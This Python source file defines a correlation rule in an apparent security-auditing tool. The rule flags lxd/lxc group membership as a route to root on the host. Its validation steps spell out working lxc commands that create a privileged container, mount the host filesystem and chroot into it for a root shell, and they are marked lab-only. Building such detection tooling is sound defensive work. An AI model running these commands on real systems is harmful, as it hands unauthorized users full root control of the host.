"""Correlate lxd/lxc group membership with a concrete root escalation.

Unlike Docker, LXD group membership alone is sufficient for a
root-equivalent attack path on most Linux distributions:

- The user can create a privileged LXD container.
- The container can mount the host filesystem.
- With `security.privileged=true`, the container runs as real root on
  the host, and `chroot` into the host gives a real root shell.

This rule therefore only needs the group finding itself, but still
produces a full AttackPath with narrative and validation steps, so
the analyst sees the same structured format as the Docker case.
"""

from __future__ import annotations

from nexus_r.analysis.correlation.path import AttackPathStatus
from nexus_r.analysis.correlation.rule import CorrelationResult, CorrelationRule
from nexus_r.analysis.finding import Confidence, Finding, Severity
from nexus_r.evidence import EvidenceStore


class LxdGroupCorrelation(CorrelationRule):
    """Correlates lxd group membership with a root-equivalent attack path."""

    id = "NEXUS-CORR-LXD-001"
    title = "LXD group => root on host"

    def evaluate(
        self, findings: list[Finding], store: EvidenceStore
    ) -> list[CorrelationResult]:
        results: list[CorrelationResult] = []
        for f in findings:
            if f.rule_id != "NEXUS-GROUP-001":
                continue
            title_lower = f.title.lower()
            if "lxd" not in title_lower and "lxc" not in title_lower:
                continue
            if "members" not in title_lower:
                continue

            results.append(
                CorrelationResult(
                    rule_id=self.id,
                    title="User in 'lxd' group can escalate to root via privileged container",
                    narrative=(
                        "The current user belongs to the 'lxd' group. "
                        "Members of this group can create LXD containers. "
                        "By creating a container with security.privileged=true "
                        "and the host filesystem mounted, the user obtains "
                        "effective root on the host."
                    ),
                    category="privilege-escalation",
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH,
                    finding_ids=[f.id],
                    entry_point="user",
                    target="root",
                    status=AttackPathStatus.PLAUSIBLE,
                    validation_steps=[
                        "Verify group membership: id",
                        "Verify LXD availability: which lxc lxd",
                        "In a LAB only:",
                        "  lxc init ubuntu:22.04 privesc -c security.privileged=true",
                        "  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
                        "  lxc start privesc",
                        "  lxc exec privesc -- /bin/sh -c 'chroot /mnt/root /bin/bash'",
                        "Do NOT run this on production systems.",
                    ],
                    references=[
                        "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/lxd-privilege-escalation",
                        "MITRE ATT&CK T1610",
                        "MITRE ATT&CK T1078.003",
                    ],
                    tags=["lxd", "lxc", "privesc", "attack-path"],
                )
            )
        return results
